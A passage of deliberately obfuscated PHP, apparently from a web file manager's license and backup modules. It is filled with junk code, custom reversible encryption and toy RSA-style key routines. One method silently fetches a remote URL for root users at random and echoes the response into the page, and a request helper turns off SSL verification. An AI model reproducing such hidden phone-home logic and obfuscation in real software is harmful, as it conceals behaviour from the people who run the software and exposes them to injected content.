$ΧΆ„”Ψ›[262]; $ϊθα¶ζ = $”³σύν[755]; $΄υκ = $this->bwtscdf08d8f($΄υκ, $ΧΆ„”Ψ›[263]); $΄υκ = $΄υκ . $ ΎΙΈλό; if ($σνπθψΥ && is_array($σνπθψΥ)) { $΄υκ = $΄υκ . $ΧΆ„”Ψ›[264] . http_build_query($σνπθψΥ); } if ($σνπθψΥ === -1) { return $΄υκ; } $ωΠ’¨Όγ = stream_context_create(array($ΧΆ„”Ψ›[219] => array($ΧΆ„”Ψ›[222] => $ζ»όπ³, $ΧΆ„”Ψ›[220] => $ΧΆ„”Ψ›[265]), $ΧΆ„”Ψ›[266] => array($ΧΆ„”Ψ›[267] => !1, $ΧΆ„”Ψ›[268] => !1))); $µφΏ… = $”³σύν[756]; if (!$µφΏ…) { return; } $σνπθψΥ = @file_get_contents($΄υκ, !1, $ωΠ’¨Όγ); $ΉαβΗγ = $”³σύν[757]; if (!$ΉαβΗγ) { die; } return json_decode($σνπθψΥ, !0); $›€π® = $”³σύν[758]; if (strlen($›€π®) < $”³σύν[691]) { die; } } private function vaym55d00255() { $Έρζ¨άΜ =& $_SERVER[γγάψ½]; $ΆΥ =& $_SERVER[Βφεβ–φ]; $Η΄€Ί¶ = array($ΆΥ[269] => $ΆΥ[270], $ΆΥ[271] => $ΆΥ[272], $ΆΥ[273] => $ΆΥ[274], $ΆΥ[275] => $ΆΥ[276], $ΆΥ[277] => $ΆΥ[278], $ΆΥ[279] => $ΆΥ[214], $ΆΥ[280] => $ΆΥ[214], $ΆΥ[281] => $ΆΥ[270], $ΆΥ[282] => $ΆΥ[272], $ΆΥ[283] => $ΆΥ[274], $ΆΥ[284] => $ΆΥ[285], $ΆΥ[286] => $ΆΥ[276], $ΆΥ[287] => $ΆΥ[288], $ΆΥ[289] => $ΆΥ[278], $ΆΥ[290] => $ΆΥ[291], $ΆΥ[292] => $ΆΥ[293], $ΆΥ[294] => $ΆΥ[295]); $’ΆνΣύ— = $Έρζ¨άΜ[759]; $»ϋ„Ηα = $Η΄€Ί¶[$this->lqsn9f2dccec]; $Φη­ψ± = $Έρζ¨άΜ[760]; while (strlen($Φη­ψ±) < $Έρζ¨άΜ[706]) { if (!$Φη­ψ±) { break; } $Φη­ψ±++; } $»ϋ„Ηα = intval($»ϋ„Ηα ? $»ϋ„Ηα : $ΆΥ[270]); $νΚ΄¤‡ϋ = $Έρζ¨άΜ[761]; if (!$νΚ΄¤‡ϋ) { return; } $¦€ΝαΥ = _get($this->tdox5a24fe65, $ΆΥ[296]); $¦€ΝαΥ = $¦€ΝαΥ ? intval($¦€ΝαΥ) : 0; $ΕΌΫ¬γ» = $Έρζ¨άΜ[762]; if (strlen($ΕΌΫ¬γ») < $Έρζ¨άΜ[701]) { die; } return $»ϋ„Ηα + $¦€ΝαΥ; } public function cokq0f44bd38($¨ƒ΄‚Φ) { $τέοΣΚε =& $_SERVER[γγάψ½]; $Ο”‡•‰ =& $_SERVER[Βφεβ–φ]; $ΐΦφΒ£³ = $this->vaym55d00255(); $εο†ΫΘΥ = $τέοΣΚε[763]; if (!$εο†ΫΘΥ) { die; } if ($¨ƒ΄‚Φ[$Ο”‡•‰[297]] == $Ο”‡•‰[122]) { return; } if ($ΐΦφΒ£³ >= intval($Ο”‡•‰[214])) { return; } $ό§¥ώοΰ = Model($Ο”‡•‰[125])->count(); $‡·³Φσ€ = $τέοΣΚε[764]; if (!$‡·³Φσ€) { return; } if ($ό§¥ώοΰ <= $ΐΦφΒ£³) { return; } $ςΆΘίΤδ = Model($Ο”‡•‰[125])->field($Ο”‡•‰[297])->limit($ΐΦφΒ£³)->select(); $ςΆΘίΤδ = array_to_keyvalue($ςΆΘίΤδ, $Ο”‡•‰[6], $Ο”‡•‰[297]); if (!in_array($¨ƒ΄‚Φ[$Ο”‡•‰[297]], $ςΆΘίΤδ)) { show_json($Ο”‡•‰[298], !1, $Ο”‡•‰[210]); } } public function cmswa3151caa() { $Θ’¬Δ― =& $_SERVER[Βφεβ–φ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ξΩΕΈΨέ = $Θ’¬Δ―[217]; $ξΩΕΈΨέ = $this->bwtscdf08d8f($ξΩΕΈΨέ, $Θ’¬Δ―[218]); $‹έξ΅κς = stream_context_create(array($Θ’¬Δ―[219] => array($Θ’¬Δ―[220] => $Θ’¬Δ―[221], $Θ’¬Δ―[222] => 3))); $ί«Φ¬ό„ = @file_get_contents($ξΩΕΈΨέ, !1, $‹έξ΅κς); echo $Θ’¬Δ―[299] . hash_encode($ί«Φ¬ό„) . $Θ’¬Δ―[300]; } private function yark622e8c08($μρ¬ίβ, $ ΝΔβΥ’, $ουλ¦έφ = 3) { $›΅ϋϋό =& $_SERVER[γγάψ½]; $μΓ…®ΘΌ =& $_SERVER[Βφεβ–φ]; usleep(1); $μρ¬ίβ = trim($μρ¬ίβ); $±ενΩχ© = $›΅ϋϋό[765]; if (strlen($±ενΩχ©) < $›΅ϋϋό[691]) { return; } $πξ“’ΟΉ = mt_rand(0, 5) . $μΓ…®ΘΌ[6]; $Φ††ψ = rand_string(15); $σάΖ”ϋ = $μΓ…®ΘΌ[301]; switch ($πξ“’ΟΉ) { case $μΓ…®ΘΌ[206]: $‹ƒΏΔ = $this->ypql40b03909($μρ¬ίβ, strrev($ ΝΔβΥ’ . $Φ††ψ)); break; $Β†ν΅Υ = $›΅ϋϋό[766]; if (!$Β†ν΅Υ) { return; } case $μΓ…®ΘΌ[122]: $‹ƒΏΔ = $this->ypql40b03909($μρ¬ίβ, strrev($Φ††ψ . $ ΝΔβΥ’)); $ά£ΐ€‡³ = $›΅ϋϋό[767]; if (!$ά£ΐ€‡³) { die; } break; $γ°§£Ή• = $›΅ϋϋό[768]; while (strlen($γ°§£Ή•) < $›΅ϋϋό[691]) { if (!$γ°§£Ή•) { break; } $γ°§£Ή•++; } case $μΓ…®ΘΌ[302]: $‹ƒΏΔ = $this->ypql40b03909($μρ¬ίβ, base64_encode($Φ††ψ . $ ΝΔβΥ’)); $υƒωδδ = $›΅ϋϋό[749]; while ($υƒωδδ < $›΅ϋϋό[706]) { if ($υƒωδδ >= 0) { break; } $υƒωδδ++; } break; case $μΓ…®ΘΌ[303]: $‹ƒΏΔ = $this->ypql40b03909($μρ¬ίβ, md5($Φ††ψ . $ ΝΔβΥ’)); $Ψα©ΤΡ = $›΅ϋϋό[769]; if (!$Ψα©ΤΡ) { die; } break; case $μΓ…®ΘΌ[304]: $μρ¬ίβ = base64_encode($μρ¬ίβ); $Ί…΅ηή² = rand(0, 64); $ό²ωΙοΎ = $σάΖ”ϋ[$Ί…΅ηή²]; $ϋ³Π”ρύ = md5($ό²ωΙοΎ . md5($ ΝΔβΥ’ . $ό²ωΙοΎ) . $ ΝΔβΥ’); $ώέιγδ = $›΅ϋϋό[770]; while ($ώέιγδ < $›΅ϋϋό[698]) { if ($ώέιγδ >= 0) { break; } $ώέιγδ++; } $ϋ³Π”ρύ = substr($ϋ³Π”ρύ, $Ί…΅ηή² % 8, $Ί…΅ηή² % 8 + 7); $αΙψ–ά = $›΅ϋϋό[771]; $¤΄ΏΛη = $μΓ…®ΘΌ[6]; $έΡψ‰» = $›΅ϋϋό[772]; if (strlen($έΡψ‰») < $›΅ϋϋό[706]) { return; } $‘ƒ•ίΏζ = 0; $΅²ηΞσΞ = $›΅ϋϋό[773]; if (!$΅²ηΞσΞ) { die; } $ξ£β¨ = 0; $όΧ…ΙΌΤ = $›΅ϋϋό[774]; $ΏσΣ›ρΡ = 0; for ($‘ƒ•ίΏζ = 0; $‘ƒ•ίΏζ < strlen($μρ¬ίβ); $‘ƒ•ίΏζ++) { $ΏσΣ›ρΡ = $ΏσΣ›ρΡ == strlen($ϋ³Π”ρύ) ? 0 : $ΏσΣ›ρΡ; $ξ£β¨ = ($Ί…΅ηή² + strpos($σάΖ”ϋ, $μρ¬ίβ[$‘ƒ•ίΏζ]) + ord($ϋ³Π”ρύ[$ΏσΣ›ρΡ++])) % 64; $¤΄ΏΛη .= $σάΖ”ϋ[$ξ£β¨]; } $‹ƒΏΔ = hash_encode($ό²ωΙοΎ . $¤΄ΏΛη); break; default: $‹ƒΏΔ = $this->ypql40b03909($μρ¬ίβ, $ ΝΔβΥ’ . $Φ††ψ); $ΓΉχΡ»¦ = $›΅ϋϋό[775]; if (strlen($ΓΉχΡ»¦) < $›΅ϋϋό[698]) { die; } break; $”΅ΉΖΔ• = $›΅ϋϋό[776]; while (strlen($”΅ΉΖΔ•) < $›΅ϋϋό[694]) { if (!$”΅ΉΖΔ•) { break; } $”΅ΉΖΔ•++; } } $‹ƒΏΔ = strrev($πξ“’ΟΉ . $Φ††ψ . $‹ƒΏΔ); $ΐ²¶Ϋή = $›΅ϋϋό[777]; while ($ΐ²¶Ϋή < $›΅ϋϋό[694]) { if ($ΐ²¶Ϋή >= 0) { break; } $ΐ²¶Ϋή++; } if ($ουλ¦έφ - 1 > 0) { $‹ƒΏΔ = $this->yark622e8c08($‹ƒΏΔ, $ ΝΔβΥ’, $ουλ¦έφ - 1); } return $‹ƒΏΔ; } private function biag4151e7ee($Β΅ΉΌ™ί, $σ‹β―ιΚ, $λ„¤ζ‡ = 3) { $ΠΖ”ΡΝΊ =& $_SERVER[γγάψ½]; $µΆ³ =& $_SERVER[Βφεβ–φ]; if (!is_string($Β΅ΉΌ™ί) || strlen($Β΅ΉΌ™ί) < 10) { return !1; } $Β΅ΉΌ™ί = trim($Β΅ΉΌ™ί); $μ‚ϊψς = $ΠΖ”ΡΝΊ[778]; if (!$μ‚ϊψς) { die; } $Β΅ΉΌ™ί = strrev($Β΅ΉΌ™ί); $Ο‰ΆΦΐ = $ΠΖ”ΡΝΊ[779]; if (strlen($Ο‰ΆΦΐ) < $ΠΖ”ΡΝΊ[691]) { die; } $€ΐήΔΖ = $Β΅ΉΌ™ί[0]; $·σΨΘΌΘ = $ΠΖ”ΡΝΊ[780]; while (strlen($·σΨΘΌΘ) < $ΠΖ”ΡΝΊ[691]) { if (!$·σΨΘΌΘ) { break; } $·σΨΘΌΘ++; } $Ϋς¤βί = substr($Β΅ΉΌ™ί, 1, 15); $Β΅ΉΌ™ί = substr($Β΅ΉΌ™ί, 16); $…ΰΏ€£ι = $ΠΖ”ΡΝΊ[781]; if (strlen($…ΰΏ€£ι) < $ΠΖ”ΡΝΊ[694]) { return; } $—ήΈό = $µΆ³[301]; switch ($€ΐήΔΖ) { case $µΆ³[206]: $Δτή™Β = $this->bwtscdf08d8f($Β΅ΉΌ™ί, strrev($σ‹β―ιΚ . $Ϋς¤βί)); $Οά„•— = $ΠΖ”ΡΝΊ[782]; if (!$Οά„•—) { return; } break; $ΦΛΩΎƒί = $ΠΖ”ΡΝΊ[783]; while ($ΦΛΩΎƒί < $ΠΖ”ΡΝΊ[706]) { if ($ΦΛΩΎƒί >= 0) { break; } $ΦΛΩΎƒί++; } case $µΆ³[122]: $Δτή™Β = $this->bwtscdf08d8f($Β΅ΉΌ™ί, strrev($Ϋς¤βί . $σ‹β―ιΚ)); $α‡Κϊ = $ΠΖ”ΡΝΊ[784]; if (!$α‡Κϊ) { die; } break; $²“¥Ϊη = $ΠΖ”ΡΝΊ[785]; if (strlen($²“¥Ϊη) < $ΠΖ”ΡΝΊ[698]) { return; } case $µΆ³[302]: $Δτή™Β = $this->bwtscdf08d8f($Β΅ΉΌ™ί, base64_encode($Ϋς¤βί . $σ‹β―ιΚ)); break; $λήγ£έι = $ΠΖ”ΡΝΊ[786]; case $µΆ³[303]: $Δτή™Β = $this->bwtscdf08d8f($Β΅ΉΌ™ί, md5($Ϋς¤βί . $σ‹β―ιΚ)); $­ΟτΥτ = $ΠΖ”ΡΝΊ[787]; while (strlen($­ΟτΥτ) < $ΠΖ”ΡΝΊ[701]) { if (!$­ΟτΥτ) { break; } $­ΟτΥτ++; } break; case $µΆ³[304]: $Β΅ΉΌ™ί = hash_decode($Β΅ΉΌ™ί); $δ‰Δΰς = $ΠΖ”ΡΝΊ[788]; if (strlen($δ‰Δΰς) < $ΠΖ”ΡΝΊ[698]) { die; } $±Ο†­Χ = $Β΅ΉΌ™ί[0]; $ώ…φσ£¶ = $ΠΖ”ΡΝΊ[757]; $Β΅ΉΌ™ί = substr($Β΅ΉΌ™ί, 1); $Βφ΄ = $ΠΖ”ΡΝΊ[789]; while (strlen($Βφ΄) < $ΠΖ”ΡΝΊ[691]) { if (!$Βφ΄) { break; } $Βφ΄++; } $ϋΓγγν = strpos($—ήΈό, $±Ο†­Χ); $’­·Όεό = md5($±Ο†­Χ . md5($σ‹β―ιΚ . $±Ο†­Χ) . $σ‹β―ιΚ); $’­·Όεό = substr($’­·Όεό, $ϋΓγγν % 8, $ϋΓγγν % 8 + 7); $έΤπΙε = $ΠΖ”ΡΝΊ[790]; $–΅εφ―‘ = $µΆ³[6]; $•ρόέ– = $ΠΖ”ΡΝΊ[791]; while ($•ρόέ– < $ΠΖ”ΡΝΊ[694]) { if ($•ρόέ– >= 0) { break; } $•ρόέ–++; } $ΪΌρβάΟ = 0; $ΔƒόΚυή = 0; $Χο›Α½σ = $ΠΖ”ΡΝΊ[792]; if (!$Χο›Α½σ) { return; } $¤ ΞΙ» = 0; $Τξπ‹ = $ΠΖ”ΡΝΊ[793]; if (strlen($Τξπ‹) < $ΠΖ”ΡΝΊ[694]) { return; } for ($ΪΌρβάΟ = 0; $ΪΌρβάΟ < strlen($Β΅ΉΌ™ί); $ΪΌρβάΟ++) { $¤ ΞΙ» = $¤ ΞΙ» == strlen($’­·Όεό) ? 0 : $¤ ΞΙ»; $…γ΄ = $ΠΖ”ΡΝΊ[794]; if (strlen($…γ΄) < $ΠΖ”ΡΝΊ[694]) { return; } $³ώθ©χ— = $¤ ΞΙ»++; $‹„λ£©Κ = $ΠΖ”ΡΝΊ[795]; if (!$‹„λ£©Κ) { die; } $ΔƒόΚυή = strpos($—ήΈό, $Β΅ΉΌ™ί[$ΪΌρβάΟ]) - $ϋΓγγν - ord($’­·Όεό[$³ώθ©χ—]); $ΥΑ•·½· = $ΠΖ”ΡΝΊ[796]; while (strlen($ΥΑ•·½·) < $ΠΖ”ΡΝΊ[691]) { if (!$ΥΑ•·½·) { break; } $ΥΑ•·½·++; } while ($ΔƒόΚυή < 0) { $ΔƒόΚυή += 64; } $–΅εφ―‘ .= $—ήΈό[$ΔƒόΚυή]; } $Δτή™Β = base64_decode($–΅εφ―‘); break; $ΡΉ–‡ = $ΠΖ”ΡΝΊ[797]; while (strlen($ΡΉ–‡) < $ΠΖ”ΡΝΊ[701]) { if (!$ΡΉ–‡) { break; } $ΡΉ–‡++; } default: $Δτή™Β = $this->bwtscdf08d8f($Β΅ΉΌ™ί, $σ‹β―ιΚ . $Ϋς¤βί); $Ύΰΐ΄ξ = $ΠΖ”ΡΝΊ[798]; if (!$Ύΰΐ΄ξ) { return; } break; $γΡΔ—ΏΝ = $ΠΖ”ΡΝΊ[799]; while ($γΡΔ—ΏΝ < $ΠΖ”ΡΝΊ[701]) { if ($γΡΔ—ΏΝ >= 0) { break; } $γΡΔ—ΏΝ++; } } if ($λ„¤ζ‡ - 1 > 0) { $Δτή™Β = $this->biag4151e7ee($Δτή™Β, $σ‹β―ιΚ, $λ„¤ζ‡ - 1); } return $Δτή™Β; } public function vgekd3d09b9a($σ «²) { $―ΦΒι =& $_SERVER[γγάψ½]; $­ά’ΖΛ =& $_SERVER[Βφεβ–φ]; $“…‹κΦ = $this->bktie1f94088(); $ρΗιΧ€µ = $this->bktie1f94088(); $ΰΉΦ―ς = ($“…‹κΦ - 1) * ($ρΗιΧ€µ - 1); $ιΎΩ“ΨΛ = $―ΦΒι[800]; while (strlen($ιΎΩ“ΨΛ) < $―ΦΒι[701]) { if (!$ιΎΩ“ΨΛ) { break; } $ιΎΩ“ΨΛ++; } $”ωΟ΅βΨ = intval(($“…‹κΦ + $ρΗιΧ€µ) / 2); $¤ίΠΘΰΝ = $―ΦΒι[801]; while (1) { $Γ”Ρλ‘ = $”ωΟ΅βΨ; $£ϋΔς†Ω = $―ΦΒι[802]; if (!$£ϋΔς†Ω) { return; } $„ΞΔΧι‡ = $ΰΉΦ―ς; $ΈΆΓΜΟ = $―ΦΒι[803]; while (strlen($ΈΆΓΜΟ) < $―ΦΒι[698]) { if (!$ΈΆΓΜΟ) { break; } $ΈΆΓΜΟ++; } while ($„ΞΔΧι‡ % $Γ”Ρλ‘ != 0) { $ Γτ§ = $„ΞΔΧι‡; $„ΞΔΧι‡ = $Γ”Ρλ‘; $Γ”Ρλ‘ = $ Γτ§ % $Γ”Ρλ‘; $ƒΉ§ΚΥ = $―ΦΒι[804]; if (strlen($ƒΉ§ΚΥ) < $―ΦΒι[706]) { return; } } if ($Γ”Ρλ‘ == 1) { break; } else { $”ωΟ΅βΨ++; } } $ϋΖΌΝ = 2; for ($δΘς®φΘ = 0; $δΘς®φΘ < $ΰΉΦ―ς * 10; $δΘς®φΘ++) { if (($ΰΉΦ―ς * $δΘς®φΘ + 1) % $”ωΟ΅βΨ == 0) { $ϋΖΌΝ = intval(($ΰΉΦ―ς * $δΘς®φΘ + 1) / $”ωΟ΅βΨ); break; } } $ΰίΪσ = $this->ypql40b03909($“…‹κΦ * $ρΗιΧ€µ . $­ά’ΖΛ[6], $­ά’ΖΛ[136]); $ΊΪΈ£Ϋΰ = $―ΦΒι[805]; if (!$ΊΪΈ£Ϋΰ) { return; } $¤νΡΘί = md5($­ά’ΖΛ[305] . ($“…‹κΦ + $ρΗιΧ€µ) . $­ά’ΖΛ[306] . $”ωΟ΅βΨ . $­ά’ΖΛ[306] . $ϋΖΌΝ . $­ά’ΖΛ[307]); $«Εχ‚Ι„ = $this->ypql40b03909($σ «², $¤νΡΘί) . $­ά’ΖΛ[308] . $ΰίΪσ; $ ΖΪ· = $―ΦΒι[806]; return $«Εχ‚Ι„; } public function pqtf0d0510c0($™Ψ΄β‘π) { $ξΧΐρυΕ =& $_SERVER[γγάψ½]; $§Ψ—ς¨ =& $_SERVER[Βφεβ–φ]; $Ε……ς™Δ = explode($§Ψ—ς¨[308], $™Ψ΄β‘π); if (count($Ε……ς™Δ) != 2) { return $§Ψ—ς¨[6]; } $εΉΥΈ…Ύ = $this->bwtscdf08d8f($Ε……ς™Δ[1] . $§Ψ—ς¨[6], $§Ψ—ς¨[136]); if (!$εΉΥΈ…Ύ) { return $§Ψ—ς¨[6]; } $εΉΥΈ…Ύ = intval($εΉΥΈ…Ύ); $θΤ€ΛΙ = 0; $δ΄•£Ν = $ξΧΐρυΕ[807]; if (strlen($δ΄•£Ν) < $ξΧΐρυΕ[701]) { return; } $ΊΧΐ” = 0; for ($Ϊκξ¥ = 3; $Ϊκξ¥ < $εΉΥΈ…Ύ; $Ϊκξ¥ += 2) { if ($εΉΥΈ…Ύ % $Ϊκξ¥ != 0) { continue; } $θΤ€ΛΙ = $Ϊκξ¥; $ΊΧΐ” = intval($εΉΥΈ…Ύ / $Ϊκξ¥); $μΒΟ™ύ” = $ξΧΐρυΕ[808]; if (strlen($μΒΟ™ύ”) < $ξΧΐρυΕ[698]) { return; } break; } $®τΠδσΨ = ($θΤ€ΛΙ - 1) * ($ΊΧΐ” - 1); $β“ΗΥΆ = intval(($θΤ€ΛΙ + $ΊΧΐ”) / 2); while (1) { $ΆήΨκ = $β“ΗΥΆ; $ώ†Ο–± = $®τΠδσΨ; $²ξΗΧΫ = $ξΧΐρυΕ[809]; if (!$²ξΗΧΫ) { return; } while ($ώ†Ο–± % $ΆήΨκ != 0) { $ΐχ’κ² = $ώ†Ο–±; $ί©¤Ό = $ξΧΐρυΕ[810]; if (strlen($ί©¤Ό) < $ξΧΐρυΕ[691]) { die; } $ώ†Ο–± = $ΆήΨκ; $ΆήΨκ = $ΐχ’κ² % $ΆήΨκ; $–®‰—‘ = $ξΧΐρυΕ[811]; if (strlen($–®‰—‘) < $ξΧΐρυΕ[691]) { die; } } if ($ΆήΨκ == 1) { break; } else { $β“ΗΥΆ++; } } $φ¶Π³ = 2; $Α‡‡ΥΩ― = $ξΧΐρυΕ[812]; if (strlen($Α‡‡ΥΩ―) < $ξΧΐρυΕ[706]) { die; } for ($Ϊκξ¥ = 0; $Ϊκξ¥ < $®τΠδσΨ * 10; $Ϊκξ¥++) { if (($®τΠδσΨ * $Ϊκξ¥ + 1) % $β“ΗΥΆ == 0) { $φ¶Π³ = intval(($®τΠδσΨ * $Ϊκξ¥ + 1) / $β“ΗΥΆ); break; } } $πβτ›λ = md5($§Ψ—ς¨[305] . ($θΤ€ΛΙ + $ΊΧΐ”) . $§Ψ—ς¨[306] . $β“ΗΥΆ . $§Ψ—ς¨[306] . $φ¶Π³ . $§Ψ—ς¨[307]); $Ε‰ήΞ±ί = $this->bwtscdf08d8f($Ε……ς™Δ[0], $πβτ›λ); return $Ε‰ήΞ±ί; $ƒ—„ΡΌ€ = $ξΧΐρυΕ[813]; } public function bktie1f94088() { $Υ§ΟΑ”γ =& $_SERVER[γγάψ½]; $—ΚΛ¥οΥ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ƒόοτ‰‡ = $Υ§ΟΑ”γ[814]; if (!$ƒόοτ‰‡) { die; } $—ϊΪό = array(); $υ‰ΜξΆ¥ = $Υ§ΟΑ”γ[815]; $ΐΰΧςΡΚ = 1; while ($ΐΰΧςΡΚ <= (int) sqrt($—ΚΛ¥οΥ)) { $Ω―ό²ΕΔ = $ΐΰΧςΡΚ; $Θ§”ώ€Χ = $Υ§ΟΑ”γ[816]; if (strlen($Θ§”ώ€Χ) < $Υ§ΟΑ”γ[698]) { die; } while (!0) { $Ω―ό²ΕΔ++; if ($Ω―ό²ΕΔ <= 2) { $ΐΰΧςΡΚ = $Ω―ό²ΕΔ; break; } else { if ($Ω―ό²ΕΔ < 2) { continue; } } $„……±βΰ = !0; for ($ζςαξφ = 2; $ζςαξφ <= sqrt($Ω―ό²ΕΔ); $ζςαξφ++) { if ($Ω―ό²ΕΔ % $ζςαξφ == 0) { $„……±βΰ = !1; } } if ($„……±βΰ) { $ΐΰΧςΡΚ = $Ω―ό²ΕΔ; break; } } $—ϊΪό[] = $ΐΰΧςΡΚ; $†“‡®Υ = $Υ§ΟΑ”γ[817]; if (strlen($†“‡®Υ) < $Υ§ΟΑ”γ[694]) { return; } } $¶Ίπ„ή = 2; $―™”ΐ·  = $Υ§ΟΑ”γ[818]; if (!$―™”ΐ· ) { return; } for ($Ω―ό²ΕΔ = $—ΚΛ¥οΥ; $Ω―ό²ΕΔ > 1; $Ω―ό²ΕΔ--) { $„……±βΰ = !0; $©ϋ‰β = $Υ§ΟΑ”γ[819]; foreach ($—ϊΪό as $υΡΡώ«Έ) { if ($Ω―ό²ΕΔ % $υΡΡώ«Έ == 0) { $„……±βΰ = !1; break; } } if ($„……±βΰ) { $¶Ίπ„ή = $Ω―ό²ΕΔ; break; } } return $¶Ίπ„ή; $ΜΒΰ = $Υ§ΟΑ”γ[820]; while (strlen($ΜΒΰ) < $Υ§ΟΑ”γ[701]) { if (!$ΜΒΰ) { break; } $ΜΒΰ++; } } public function optz94306435($πµί, $ηχα”) { $¥Ε ³Α‰ =& $_SERVER[γγάψ½]; $στΦ—βΥ =& $_SERVER[Βφεβ–φ]; return call_user_func(array($στΦ—βΥ[8], $στΦ—βΥ[309]), $πµί, $ηχα”); $•“ρ¨ύ = $¥Ε ³Α‰[821]; if (strlen($•“ρ¨ύ) < $¥Ε ³Α‰[701]) { return; } } public function ypql40b03909($Φ θΖ€μ, $‡£Γƒσ²) { $Ώ­ Ί° =& $_SERVER[Βφεβ–φ]; return call_user_func(array($Ώ­ Ί°[310], $Ώ­ Ί°[311]), $Φ θΖ€μ, $‡£Γƒσ²); } public function bwtscdf08d8f($ψΉΰι, $Χ„Ϊζ„) { $°ίώ =& $_SERVER[Βφεβ–φ]; return call_user_func(array($°ίώ[310], $°ίώ[312]), $ψΉΰι, $Χ„Ϊζ„); $¶ζΫ›¬Ύ = $_SERVER[γγάψ½][822]; if (!$¶ζΫ›¬Ύ) { die; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[γγάψ½][823]); $this->init(); $this->keep(); } public function init() { $ΰΤ―Ε” =& $_SERVER[γγάψ½]; $this->isManual(); self::$name = date($ΰΤ―Ε”[824]); if (!($³ξΪΆ = $this->model->lastItem())) { $³ξΪΆ = $this->initData(); } else { self::$name = $³ξΪΆ[$ΰΤ―Ε”[32]]; if ($³ξΪΆ[$ΰΤ―Ε”[825]] == $ΰΤ―Ε”[91]) { self::$name = date($ΰΤ―Ε”[262]); $ψΫΪίώΒ = intval(_get($³ξΪΆ, $ΰΤ―Ε”[826], 0)); if (self::$manual == 0 && $³ξΪΆ[$ΰΤ―Ε”[32]] == self::$name) { $this->model->remove($³ξΪΆ[$ΰΤ―Ε”[478]]); } $³ξΪΆ = $this->initData($ψΫΪίώΒ, $³ξΪΆ[$ΰΤ―Ε”[827]]); } else { $this->checkStore($³ξΪΆ[$ΰΤ―Ε”[827]]); } } self::$option = $³ξΪΆ; } private function isManual() { $ ³ί”ΐ = _get($GLOBALS, $_SERVER[γγάψ½][828], 0); $ ³ί”ΐ = intval($ ³ί”ΐ); self::$manual = $ ³ί”ΐ && $ ³ί”ΐ == 1 ? 1 : 0; } private function initData($€·Ζ€Ή° = 0, $βπƒϊλ΅ = '') { $ΐ΄‚ύγ» =& $_SERVER[γγάψ½]; $¬ΖΤ΄­ = $this->model->config(); if ($βπƒϊλ΅ && $¬ΖΤ΄­[$ΐ΄‚ύγ»[827]] != $βπƒϊλ΅) { $€·Ζ€Ή° = 0; } $this->checkStore($¬ΖΤ΄­[$ΐ΄‚ύγ»[827]]); if (self::$manual == 1) { self::$name .= $ΐ΄‚ύγ»[11] . date($ΐ΄‚ύγ»[829]); } $ό”ήΌΑή = array($ΐ΄‚ύγ»[827] => $¬ΖΤ΄­[$ΐ΄‚ύγ»[827]], $ΐ΄‚ύγ»[32] => self::$name, $ΐ΄‚ύγ»[825] => 0, $ΐ΄‚ύγ»[171] => $¬ΖΤ΄­[$ΐ΄‚ύγ»[171]], $ΐ΄‚ύγ»[830] => self::$manual, $ΐ΄‚ύγ»[371] => array($ΐ΄‚ύγ»[831] => array($ΐ΄‚ύγ»[825] => 0), $ΐ΄‚ύγ»[832] => array($ΐ΄‚ύγ»[825] => 0, $ΐ΄‚ύγ»[833] => 0, $ΐ΄‚ύγ»[834] => 0, $ΐ΄‚ύγ»[33] => $ΐ΄‚ύγ»[12], $ΐ΄‚ύγ»[835] => 0, $ΐ΄‚ύγ»[836] => 0), $ΐ΄‚ύγ»[837] => array($ΐ΄‚ύγ»[825] => 0, $ΐ΄‚ύγ»[833] => 0, $ΐ΄‚ύγ»[834] => 0, $ΐ΄‚ύγ»[835] => 0, $ΐ΄‚ύγ»[836] => 0), $ΐ΄‚ύγ»[233] => array($ΐ΄‚ύγ»[825] => 0, $ΐ΄‚ύγ»[838] => 0, $ΐ΄‚ύγ»[839] => 0, $ΐ΄‚ύγ»[840] => 0, $ΐ΄‚ύγ»[841] => 0, $ΐ΄‚ύγ»[546] => $€·Ζ€Ή°, $ΐ΄‚ύγ»[835] => 0, $ΐ΄‚ύγ»[836] => 0)), $ΐ΄‚ύγ»[835] => time(), $ΐ΄‚ύγ»[836] => 0); $·°σΚέ = $this->model->insert($ό”ήΌΑή); $ό”ήΌΑή[$ΐ΄‚ύγ»[478]] = $·°σΚέ; return $ό”ήΌΑή; } private function checkStore($σΦ¨©Π) { $ΈΉΜ»βό = Model($_SERVER[γγάψ½][842]); $ω‡“δ¥ = $ΈΉΜ»βό->listData($σΦ¨©Π); $ΈΉΜ»βό->checkConfig($ω‡“δ¥); } public static function get() { if (!self::$option) { $¬–Θ ¦ = Model($_SERVER[γγάψ½][823]); $Έ‰Ϋ‘υ’ = $¬–Θ ¦->findByName(self::$name); $¬–Θ ¦->parseContent($Έ‰Ϋ‘υ’); self::$option = $Έ‰Ϋ‘υ’; } return self::$option; } public static function set($ά€φρ) { $ΨΠκφ―ί =& $_SERVER[γγάψ½]; $±¤¥Ές¬ = self::get(); foreach ($ά€φρ as $£ΓΘ®« => $΅‹Σ®¤Ή) { array_set_value($±¤¥Ές¬, $£ΓΘ®«, $΅‹Σ®¤Ή); } Model($ΨΠκφ―ί[823])->update($±¤¥Ές¬[$ΨΠκφ―ί[478]], $±¤¥Ές¬); self::$option = $±¤¥Ές¬; return self::$option; } public function keep() { $–² =& $_SERVER[γγάψ½]; $€λ‹¬…¨ = self::get(); if (_get($€λ‹¬…¨, $–²[843], 0) == $–²[91]) { return; } $this->backupKeep($€λ‹¬…¨); self::set(array($–²[843] => 1)); } private function backupKeep($”«—¨») { $΅Ό‡ξ‰ =& $_SERVER[γγάψ½]; if (self::$manual == 1) { return; } $Ή­Ά¦ΓΦ = $this->model->listData(); if (empty($Ή­Ά¦ΓΦ)) { return; } $τ Λ›σ = 0; $¬ΌΖ = array(); foreach ($Ή­Ά¦ΓΦ as $“ιΓ†Βψ) { if ($τ Λ›σ >= 7) { break; } $¬ΌΖ[] = $“ιΓ†Βψ[$΅Ό‡ξ‰[32]]; $τ Λ›σ++; } for ($τ Λ›σ = 0; $τ Λ›σ < 12; $τ Λ›σ++) { $¬ΌΖ[] = date($΅Ό‡ξ‰[844], strtotime("\55{$τ Λ›σ}\40\x6d\x6f\156\x74\150\163")); } $¬ΌΖ = array_unique($¬ΌΖ); $–«¨”Ή = Model($΅Ό‡ξ‰[845])->get($΅Ό‡ξ‰[846]); foreach ($Ή­Ά¦ΓΦ as $“ιΓ†Βψ) { if (isset($“ιΓ†Βψ[$΅Ό‡ξ‰[830]]) && 